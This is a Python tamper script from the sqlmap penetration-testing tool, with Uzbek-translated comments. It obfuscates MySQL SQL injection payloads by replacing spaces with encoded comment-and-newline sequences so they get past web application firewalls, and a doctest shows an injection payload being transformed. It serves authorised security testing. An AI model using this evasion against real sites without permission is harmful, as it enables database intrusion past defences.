#!/usr/bin/env python

"""
Copyright (c) 2006-2026 sqlmap developers (https://sqlmap.org)
See the file 'LICENSE' for copying permission
"""

import os
import random
import string

from lib.core.common import singleTimeWarnMessage
from lib.core.compat import xrange
from lib.core.enums import DBMS
from lib.core.enums import PRIORITY

__priority__ = PRIORITY.LOW

def dependencies():
    singleTimeWarnMessage("'%s' tamper skripti faqat %s uchun mo'ljallangan" % (os.path.basename(__file__).split(".")[0], DBMS.MYSQL))

def tamper(payload, **kwargs):
    """
    MySQL bo'shliqlarini #, tasodifiy matn va yangi qatorga almashtiradi.

    Requirement:
        * MySQL

    Tested against:
        * MySQL 4.0, 5.0

    Notes:
        * Useful to bypass several web application firewalls
        * Used during the ModSecurity SQL injection challenge,
          http://modsecurity.org/demo/challenge.html

    >>> random.seed(0)
    >>> tamper('1 AND 9227=9227')
    '1%23upgPydUzKpMX%0AAND%23RcDKhIr%0A9227=9227'
    """

    retVal = ""

    if payload:
        quote, doublequote = False, False

        for i in xrange(len(payload)):
            if payload[i] == '\'' and (i == 0 or payload[i - 1] != '\\'):
                quote = not quote
            elif payload[i] == '"' and (i == 0 or payload[i - 1] != '\\'):
                doublequote = not doublequote

            if not quote and not doublequote:
                if payload[i].isspace():
                    randomStr = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase) for _ in xrange(random.randint(6, 12)))
                    retVal += "%%23%s%%0A" % randomStr
                elif payload[i] == '#' or payload[i:i + 3] == '-- ':
                    retVal += payload[i:]
                    break
                else:
                    retVal += payload[i]
            else:
                retVal += payload[i]

    return retVal
